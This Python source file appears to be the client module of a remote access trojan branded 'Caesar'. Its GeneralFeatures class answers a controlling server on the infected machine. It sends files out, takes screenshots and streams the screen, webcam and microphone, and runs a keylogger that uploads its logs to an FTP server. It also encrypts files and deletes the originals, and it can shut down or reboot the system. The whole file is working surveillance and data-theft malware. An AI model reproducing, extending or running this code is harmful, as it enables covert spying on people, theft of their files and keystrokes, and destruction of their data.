import os
from PIL import ImageGrab
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
import cv2
import struct
import time
import pickle
import numpy as np
import imutils
import pyaudio
import ftplib
import threading
from keylogger import Keylogger



class GeneralFeatures:

        def __init__(self):
            self.now = datetime.now()
            self.paudio = pyaudio.PyAudio()
            self.log = ""
            self.Keylogger = Keylogger()
            self.KeyloggerThread = None
            self.stop_event = threading.Event()


        def convert_text_bold_red(self, text):
            RESET = "\033[0m"
            BOLD = "\033[1m"
            COLOR = "\u001b[36m"
            return f"{BOLD}{COLOR}{text}{RESET}"


        # sends file to server
        def send_client_file(self, conn, usrFile):
            try:
                conn.send(usrFile.encode())
                # checks if file exists
                if not os.path.exists(usrFile):
                    conn.send("File does not exist!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                else:
                    conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                    time.sleep(1)
                    fileSize = os.path.getsize(usrFile)
                    conn.send(str(fileSize).encode())
                    time.sleep(1)

                    with open(usrFile, 'rb') as file:
                        data = file.read(1024)
                        if fileSize == 0:
                            pass
                        elif fileSize < 1024:
                            conn.send(data)
                            file.close()
                        else:
                            while data:
                                conn.send(data)
                                data = file.read(1024)
                            file.close()
            except:
                conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())


        # receives file from server
        def receive_server_file(self, conn, usrFile):
            try:
                fileSize = int(conn.recv(1024).decode())

                if fileSize == 0:  # if file is empty do nothing
                    # send current working directory back to server
                    conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                else:
                    with open(usrFile, 'wb') as file:
                        if fileSize < 1024:
                            data = conn.recv(1024)
                            file.write(data)
                            file.close()
                        else:
                            data = conn.recv(1024)
                            totalFileRecv = len(data)

                            while totalFileRecv < fileSize:
                                totalFileRecv += len(data)
                                file.write(data)
                                data = conn.recv(1024)
                            file.write(data)
                            file.close()
                    conn.send("File sent!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
            except:
                conn.send("Error occurred sending file!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())



        # sends screenshot back to server
        def screenshot(self, conn):
            try:
                conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())  # send current working directory back to server
                img = ImageGrab.grab()  # capture image
                img_np = np.array(img)
                frame = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)
                temp_imgName = "img.jpg"  # image name
                cv2.imwrite(temp_imgName, frame)  # write image to a file
                cv2.destroyAllWindows()

                fileSize = os.path.getsize(temp_imgName)
                conn.send(str(self.now.strftime("%d:%m:%Y_%H:%M:%S")).encode() + "_screenshot".encode())
                time.sleep(1)
                conn.send(str(fileSize).encode())
                with open(temp_imgName, 'rb') as file:
                    content = file.read(1024)
                    while content:
                        conn.send(content)
                        content = file.read(1024)
                file.close()
                os.remove("img.jpg")
            except:
                pass


        #sends live feed of screen recording back to server
        def live_screen_feed(self, conn):
            conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
            img_counter = 0
            try:
                while True:
                    screen = np.array(ImageGrab.grab(bbox=(0, 0, 1800, 700)))
                    screen = cv2.cvtColor(np.array(screen), cv2.COLOR_RGB2BGR)
                    data = pickle.dumps(screen, 0)
                    size = len(data)

                    if img_counter % 10 == 0:
                        conn.sendall(struct.pack(">L", size) + data)
                        response = conn.recv(1024).decode()
                        if response == "exit":
                            break

                    img_counter += 1
            except:
                pass


        # sends live feed of webcam back to server
        def capture_webcam_video(self, conn):
            conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
            cam = cv2.VideoCapture(0)

            img_counter = 0
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]

            try:
                while True:
                    ret, frame = cam.read()
                    frame = imutils.resize(frame, width=320)
                    frame = cv2.flip(frame, 280)
                    result, image = cv2.imencode('.jpg', frame, encode_param)
                    data = pickle.dumps(image, 0)
                    size = len(data)

                    if img_counter % 10 == 0:
                        conn.send(struct.pack(">L", size) + data)

                        data = conn.recv(1024).decode()
                        if data == "exit":
                            cam.release()
                            break

                    img_counter += 1
            except:
                cam.release()



        #sends camshot from webcam back to server
        def webcam_capture(self, conn):
            conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())

            try:
                capture = cv2.VideoCapture(0)
                ret, frame = capture.read()  # capture frame by frame
                clientImage = "img.jpg"  # image name
                cv2.imwrite(clientImage, frame)  # write image to a file
                capture.release()  # release capture
                cv2.destroyAllWindows()

                fileSize = os.path.getsize(clientImage)
                conn.send(
                     str(self.now.strftime("%d:%m:%Y_%H:%M:%S")).encode() + "_camshot".encode())
                time.sleep(1)
                conn.send(str(fileSize).encode())
                # send file content
                with open(clientImage, 'rb') as file:
                    content = file.read(1024)
                    while content:
                        conn.send(content)
                        content = file.read(1024)
                file.close()
                os.remove(clientImage)  # remove image from client machine
            except:
                pass



        # encrypt specified file
        def encrypt_file(self, conn, password, filename):
            try:
                hashed_key = SHA256.new(password.encode('utf-8')).digest()  # hash for extra randomisation

                if os.path.exists(filename):
                    encrypted_file = "(Encrypted)" + filename  # append Encrypted to the beginning of the file name
                    filesize = str(os.path.getsize(filename)).rjust(AES.block_size, '0')  # pad each block by 16
                    IV = Random.new().read(AES.block_size)  # initialization vector for randomisation

                    encrypt_file = AES.new(hashed_key, AES.MODE_CBC, IV)

                    with open(filename, 'rb') as usrFile:
                        with open(encrypted_file, 'wb') as outfile:
                            outfile.write(filesize.encode('utf-8'))
                            outfile.write(IV)

                            while True:
                                block = usrFile.read(65536)
                                if len(block) == 0:
                                    break
                                elif len(block) % 16 != 0:
                                    block += b' ' * (16 - (len(block) % 16))  # pad the rest of data to equal 16

                                outfile.write(encrypt_file.encrypt(block))  # encrypt block
                            usrFile.close()
                        os.remove(filename)

                    conn.send("[-] File has been encrypted!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                else:
                    conn.send("[-] Unable to encrypt file!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                    pass
            except:
                conn.send("[-] Unable to encrypt file!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())



        # decrypt specified file
        def decrypt_file(self, conn, password, filename):
            try:
                hashed_key = SHA256.new(password.encode('utf-8')).digest()

                if os.path.exists(filename):
                    outputFile = filename.split("\\")
                    outputFile = "".join(outputFile[-1])
                    outputFile = outputFile.replace("(Encrypted)", "")  # remove (Encrypted from file name)

                    with open(filename, 'rb') as encrypted_file:
                        filesize = int(encrypted_file.read(16))
                        IV = encrypted_file.read(AES.block_size)  # initialization vector for randomisation
                        decrypt_file = AES.new(hashed_key, AES.MODE_CBC, IV)

                        with open(outputFile, 'wb') as decrypted_file:
                            while True:
                                block = encrypted_file.read(65536)

                                if len(block) == 0:
                                    break
                                decrypted_file.write(decrypt_file.decrypt(block))  # decrypt block
                            decrypted_file.truncate(filesize)

                    os.remove(filename)
                    conn.send("[+] File has been decrypted!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                else:
                    conn.send("[-] File does not exist!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
            except:
                conn.send("[-] Unable to decrypt file!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())



        #send microphone audio stream back to the server
        def live_audio_feed(self, conn):
            try:
                conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())

                chunk = 20000
                FORMAT = pyaudio.paInt16
                channels = 1
                sample_rate = 44100

                # open stream object as input & output
                stream = self.paudio.open(format=FORMAT, channels=channels,
                                     rate=sample_rate, input=True,
                                     output=True, frames_per_buffer=chunk)

                while True:
                    data = stream.read(chunk)
                    new_data = pickle.dumps(data)

                    message = struct.pack("Q", len(new_data)) + new_data
                    conn.sendall(message)
                    resp = conn.recv(1024).decode()

                    if resp == "exit":
                        stream.stop_stream()  # stop and close stream
                        stream.close()
                        self.paudio.terminate()  # terminate pyaudio object
                    #print(resp)
            except:
                pass



        #===================================================FTP FILE HANDLING===========================================

        def client_folder_exist(self, ftp, folderId, client_id):
            try:
                if folderId in ftp.nlst():
                    ftp.cwd(folderId)
                else:
                    ftp.mkd(folderId)
                    ftp.cwd(folderId)

                if client_id in ftp.nlst():
                    ftp.cwd(client_id)
                else:
                    ftp.mkd(client_id)
                    ftp.cwd(client_id)
            except Exception as e:
                pass
                #print(e)



        #uploads file to ftp server
        def upload_file_via_ftp(self, conn, filename, FTP_PASS, folderId, client_id, FTP_HOST, FTP_USER):

            try:
                ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
                self.client_folder_exist(ftp, folderId, client_id)

                ftp.encoding = "utf-8"

                with open(filename, "rb") as file:
                    ftp.storbinary(f"STOR {filename}", file)
                ftp.quit()

                conn.send("[+] File has been uploaded!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
            except:
                conn.send("[-] Something went wrong uploading file!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())


        #downloads file from ftp server
        def download_file_via_ftp(self, conn, filename, FTP_PASS, folderId, client_id, FTP_HOST, FTP_USER):

            try:

                ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
                ftp.encoding = "utf-8"

                self.client_folder_exist(ftp, folderId, client_id)

                with open(filename, "wb") as file:
                    ftp.retrbinary(f"RETR {filename}", file.write)
                ftp.quit()

                conn.send("[+] File has been Downloaded!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())

            except Exception as e:
                print(e)
                conn.send("[-] Something went wrong downloading file: {e} \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())


        #===================================================FTP FILE HANDLING===========================================



        # ===================================================Keylogger==================================================

        #starts keylogger
        def keylogger_handler(self, conn, filename, folderId, client_id, FTP_HOST, FTP_USER, FTP_PASS):
            try:
                self.KeyloggerThread = threading.Thread(target=self.Keylogger.start_keylogger, args=(filename, folderId, client_id, FTP_HOST, FTP_USER, FTP_PASS))
                self.KeyloggerThread.start()
                conn.send("[+] Keylogger started!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
            except:
                conn.send("[-] Unable to start keylogger!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())


        #stops keylogger thread
        def stop_keylogger(self, conn):
            try:
                if self.KeyloggerThread.is_alive():
                    self.Keylogger.stop_timer()
                    self.KeyloggerThread.join()
                    conn.send("[+] Keylogger stopped!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                else:
                    conn.send("[+] Keylogger is not active!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
            except Exception as e:
                #print(e)
                conn.send("[-]Error occurred while stopping keylogger!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(
                    os.getcwd() + ": ").encode())


        #confirms if keylogger is running
        def is_keylogger_active(self, conn):
            try:
                if self.KeyloggerThread.is_alive():
                    conn.send("[+] Keylogger is active!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                else:
                    conn.send("[+] Keylogger is not active!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
            except:
                conn.send("[+] Keylogger is not active!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())

        # ===================================================Keylogger==================================================



        #shut down system
        def shutdown(self, conn):
            try:
                os.system("shutdown /s /t 0")
            except:
                conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())


        #reboot system
        def reboot(self, conn):
            try:
                os.system("shutdown -t 0 -r -f")
            except:
                conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())

